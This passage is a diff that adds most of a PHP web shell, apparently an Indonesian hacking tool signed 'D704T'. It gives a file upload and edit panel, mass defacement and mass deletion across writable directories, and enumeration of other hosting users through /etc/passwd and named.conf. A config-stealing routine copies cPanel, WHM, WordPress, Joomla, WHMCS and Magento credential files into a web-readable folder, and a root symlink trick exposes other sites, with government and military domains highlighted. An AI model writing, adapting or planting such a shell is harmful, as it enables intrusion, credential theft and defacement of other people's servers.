+<hr color=#666666><center>";
 
+/*uploads*/
+if($_GET['jomblo'] == 'upload') {
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo '<font color="#52CF38">Upload Sukses Senpai!!</font><br />';
+}else{
+echo '<font color="#666666">Upload Gagal Senpai!!</font><br />';
+}
+}
+echo '<form enctype="multipart/form-data" method="POST"><font color="#D0D5D5" size="4"><br>
+Upload File :<br><input type="file" name="file" />
+<input type="submit" value="Upload" />
+</form><br>
+</td></tr>';	
+
+//MASS Deface
+} elseif(isset($_GET['jomblo']) && ($_GET['jomblo'] == 'mass_deface')){
+	function sabun_massal($dir,$namafile,$isi_script) {
+		foreach($j as $lokasi)
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							
+							echo "[<font color=#52CF38>Selesai</font>] $lokasi<br>";
+							file_put_contents($lokasi, $isi_script);
+							$idx = sabun_massal($dirc,$namafile,$isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	function sabun_biasa($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=#52CF38>Selesai</font>] $dirb/$namafile<br>";
+							file_put_contents($lokasi, $isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	if($_POST['start']) {
+		if($_POST['tipe_sabun'] == 'mahal') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		} elseif($_POST['tipe_sabun'] == 'murah') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		}
+	} else {
+	echo "<center>";
+	echo "<form method='post'>
+	<font>Type  Sabun :</font><br>
+	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
+	<font>Folder :</font><br>
+	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
+	<font>Filename :</font><br>
+	<input type='text' name='d_file' value='jefriganteng.php' style='width: 450px;' height='10'><br>
+	<font>Index File :</font><br>
+	<textarea name='script' style='width: 450px; height: 200px;'>Pastekan Script deface Kalian disini!</textarea><br>
+	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
+	</form></center>";
+	}
+	}
+
+//MASS DELETE/////////////////////////
+elseif($_GET['jomblo'] == 'mass_delete') {
+   function hapus_massal($dir,$namafile) {
+if(is_writable($dir)) {
+   $dira = scandir($dir);
+   foreach($dira as $dirb) {
+       $dirc = "$dir/$dirb";
+       $lokasi = $dirc.'/'.$namafile;
+       if($dirb === '.') {
+           if(file_exists("$dir/$namafile")) {
+               unlink("$dir/$namafile");
+           }
+       } elseif($dirb === '..') {
+           if(file_exists("".dirname($dir)."/$namafile")) {
+               unlink("".dirname($dir)."/$namafile");
+           }
+       } else {
+           if(is_dir($dirc)) {
+               if(is_writable($dirc)) {
+                   if(file_exists($lokasi)) {
+                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
+                       unlink($lokasi);
+                       $idx = hapus_massal($dirc,$namafile);
+                   }
+               }
+           }
+       }
+   }
+}
+   }
+   if($_POST['start']) {
+echo "<div style='margin: 5px auto; padding: 5px'>";
+hapus_massal($_POST['d_dir'], $_POST['d_file']);
+echo "</div>";
+   } else {
+   echo "<center>";
+   echo "<form method='post'>
+   <font>Folder :</font><br>
+   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
+   <font>Filename :</font><br>
+   <input type='text' name='d_file' value='jefriganteng.php' style='width: 450px;' height='10'><br>
+   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
+   </form></center>";
+   }
+
+##JUMPING 
+} elseif($_GET['jomblo'] == 'jumping') {
+   $i = 0;
+   echo "<pre><div class='margin: 5px auto;'>";
+   $etc = fopen("/etc/passwd", "r") or die("<font color=#666666>Can't read /etc/passwd</font>");
+   while($passwd = fgets($etc)) {
+if($passwd == '' || !$etc) {
+   echo "<font color=#666666>Can't read /etc/passwd</font>";
+} else {
+   preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+   foreach($user_jumping[1] as $user_jefri_jump) {
+       $user_jumping_dir = "/home/$user_jefri_jump/public_html";
+       if(is_readable($user_jumping_dir)) {
+           $i++;
+           $jrw = "[<font color=#52CF38>R</font>] <a href='?dir=$user_jumping_dir'><font color=#D0D5D5>$user_jumping_dir</font></a>";
+           if(is_writable($user_jumping_dir)) {
+               $jrw = "[<font color=#52CF38>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#D0D5D5>$user_jumping_dir</font></a>";
+           }
+           echo $jrw;
+           if(function_exists('posix_getpwuid')) {
+               $domain_jump = file_get_contents("/etc/named.conf");   
+               if($domain_jump == '') {
+                   echo " => ( <font color=#666666>gagal mengambil nama domain nya</font> )<br>";
+               } else {
+                   preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+                   foreach($domains_jump[1] as $dj) {
+                       $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+                       $user_jumping_url = $user_jumping_url['name'];
+                       if($user_jumping_url == $user_jefri_jump) {
+                           echo " => ( <u>$dj</u> )<br>";
+                           break;
+                       }
+                   }
+               }
+           } else {
+               echo "<br>";
+           }
+       }
+   }
+}
+   }
+   if($i == 0) {
+   } else {
+echo "<br>Total ada ".$i." Kamar ada ".gethostbyname($_SERVER['HTTP_HOST'])."";
+   
+   echo "</div></pre>";
+		}
+
+//CONFIG///////////
+} elseif($_GET['jomblo'] == 'config') {
+   $etc = fopen("/etc/passwd", "r") or die("<pre><font color=#666>Can't read /etc/passwd</font></pre>");
+   $idx = mkdir("3X0RC1ST_CONFIG", 0777);
+   $isi_htc = "Options all\nRequire None\nSatisfy Any";
+   $htc = fopen("3X0RC1ST_CONFIG/.htaccess","w");
+   fwrite($htc, $isi_htc);
+   while($passwd = fgets($etc)) {
+if($passwd == "" || !$etc) {
+   echo "<font color=#666>Can't read /etc/passwd</font>";
+} else {
+   preg_match_all('/(.*?):x:/', $passwd, $user_config);
+   foreach($user_config[1] as $user_3X0RC1ST) {
+       $user_config_dir = "/home/$user_3X0RC1ST/public_html/";
+       if(is_readable($user_config_dir)) {
+           $grab_config = array(
+               "/home/$user_3X0RC1ST/.my.cnf" => "cpanel",
+               "/home/$user_3X0RC1ST/.accesshash" => "WHM-accesshash",
+               "/home/$user_3X0RC1ST/public_html/vdo_config.php" => "Voodoo",
+               "/home/$user_3X0RC1ST/public_html/bw-configs/config.ini" => "BosWeb",
+               "/home/$user_3X0RC1ST/public_html/config/koneksi.php" => "Lokomedia",
+               "/home/$user_3X0RC1ST/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
+               "/home/$user_3X0RC1ST/public_html/clientarea/configuration.php" => "WHMCS",
+               "/home/$user_3X0RC1ST/public_html/whm/configuration.php" => "WHMCS",
+               "/home/$user_3X0RC1ST/public_html/whmcs/configuration.php" => "WHMCS",
+               "/home/$user_3X0RC1ST/public_html/forum/config.php" => "phpBB",
+               "/home/$user_3X0RC1ST/public_html/sites/default/settings.php" => "Drupal",
+               "/home/$user_3X0RC1ST/public_html/config/settings.inc.php" => "PrestaShop",
+               "/home/$user_3X0RC1ST/public_html/app/etc/local.xml" => "Magento",
+               "/home/$user_3X0RC1ST/public_html/joomla/configuration.php" => "Joomla",
+               "/home/$user_3X0RC1ST/public_html/configuration.php" => "Joomla",
+               "/home/$user_3X0RC1ST/public_html/wp/wp-config.php" => "WordPress",
+               "/home/$user_3X0RC1ST/public_html/wordpress/wp-config.php" => "WordPress",
+               "/home/$user_3X0RC1ST/public_html/wp-config.php" => "WordPress",
+               "/home/$user_3X0RC1ST/public_html/admin/config.php" => "OpenCart",
+               "/home/$user_3X0RC1ST/public_html/slconfig.php" => "Sitelok",
+               "/home/$user_3X0RC1ST/public_html/application/config/database.php" => "Ellislab");
+           foreach($grab_config as $config => $nama_config) {
+               $ambil_config = file_get_contents($config);
+               if($ambil_config == '') {
+               } else {	
+                   $file_config = fopen("3X0RC1ST_CONFIG/$user_jefri-$nama_config.txt","w");
+                   fputs($file_config,$ambil_config);
+               }
+           }
+       }      
+   }
+}  
+   }
+   echo "<center><a href='?path=$path/3X0RC1ST_CONFIG'><font color=#52CF38>Selesai!</font></a></center>";
+//symlink
+} elseif(isset($_GET['jomblo']) && ($_GET['jomblo'] == 'symlink')) {	 
+	 echo " <form action= method=post>";
+@set_time_limit(0);
+echo "<center><font color=#DBDBDB>";
+@mkdir('sym',0777); 
+$htaccess = "Options all \n DirectoryIndex sym.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $write =@fopen ('sym/.htaccess','w'); fwrite($write ,$htaccess); @symlink('/','sym/root'); $filelocation = basename(__FILE__); $read_named_conf = @file('/etc/named.conf'); if(!$read_named_conf) { echo "<br><br><font color='#666666'>Cant access this file on server -> [ /etc/named.conf ]</font></center>"; } else { echo "<table width='700px' border='1' cellpadding='3' cellspacing='0' align='center'><td style='background:#666;color:#000;'>Domain</td><td style='background:#666;color:#000;'>Users</td><td style='background:#666;color:#000;'>Symlink </td>"; foreach($read_named_conf as $subject){ if(eregi('zone',$subject)){ preg_match_all('#zone "(.*)"#',$subject,$string); flush(); if(strlen(trim($string[1][0])) >2){ $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); $name = $UID['name'] ; @symlink('/','sym/root'); $name = $string[1][0]; $iran = '\.ir'; $israel = '\.il'; $indo = '\.id'; $sg12 = '\.sg'; $edu = '\.edu'; $gov = '\.gov'; $gose = '\.go'; $gober = '\.gob'; $mil1 = '\.mil'; $mil2 = '\.mi'; if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0]) or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])) { $name = "<font color=#D0D5D5>".$string[1][0].'</font>'; } echo " <tr> <td><a target=_blank href=http://www.".$string[1][0].'/>'.$name.' </a>  </td> <td style=border-left:1px solid #52CF38;> '.$UID['name']." </td> <td style=border-left:1px solid white;> <a href=sym/root/home/".$UID['name']."/public_html target=_blank>Symlink </a> </td> </tr>"; flush(); } } } } echo "</center></table></font>"; 
+
+//*START*//
+} elseif(isset($_GET['filesrc'])){
+echo "<tr><td>Current File : ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo(' <center><textarea style="width:655px;height:300px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br />'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="#52CF38">Ganti  Permission Berhasil</font><br />';
+}else{
+echo '<font color="#666666">Ganti Permission Gagal</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Chmod" />
+</form>';
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="#52CF38">Ganti Nama Berhasil</font><br />';
+}else{
+echo '<font color="#666666">Ganti Nama Gagal</font><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+Nama Baru : <input name="newname" type="text" size="30" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Ubah Nama" />
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="#52CF38">Edit File Berhasil</font><br />';
+}else{
+echo '<font color="#bd29ff">Edit File Gagal</font><br />';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Edit File" />
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br /><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo '<font color="#52CF38">Hapus Dir Berhasil</font><br />';
+}else{
+echo '<font color="#666666">Hapus Dir Gagal</font><br />';
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo '<font color="#52CF38">Hapus File Berhasil</font><br />';
+}else{
+echo '<font color="#666666">Hapus File Gagal</font><br />';
+}
+}
+}
+		
+echo '</center>';
+$scandir = scandir($path);
+echo '<div id="content"><table width="705px" border="0" cellpadding="4" cellspacing="0" align="center">
+<tr class="first">
+<th><center><font color=#000 size=3>Name</font></center></th>
+<th><center><font color=#000 size=3>Size</font></center></th>
+<th><center><font color=#000 size=3>Permissions</font></center></th>
+<th><center><font color=#000 size=3>Options</font></center></th>
+</tr>';
+
+foreach($scandir as $dir){
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+echo '<tr>
+<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td><center>---</center></td>
+<td><center>';
+if(is_writable($path.'/'.$dir)) echo '<font color="#52CF38">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="#DBDBDB">';
+echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"Select\">  </option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"dir\">
+<input type=\"hidden\" name=\"name\" value=\"$dir\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+<input type=\"submit\" value=\"Go\" />
+</form></center></td>
+</tr>";
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file("$path/$file")) continue;
+$size = filesize("$path/$file")/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo "<tr>
+<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+<td><center>".$size."</center></td>
+<td><center>";
+if(is_writable("$path/$file")) echo '<font color=#52CF38>';
+elseif(!is_readable("$path/$file")) echo '<font color=#DBDBDB>';
+echo perms("$path/$file");
+if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"Select\">  </option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
+<option value=\"edit\">Edit</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+<input type=\"submit\" value=\"Go\" />
+</form></center></td>
+</tr>";
+}
+echo '</table>
+</div>';
+}
+echo '<br /><center><font size=3 ; color=#DBDBDB>Copyright &copy; 2019 <font color="#52CF38">D704T</font></center>
+
+</body>
+</html>';
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
 ?>
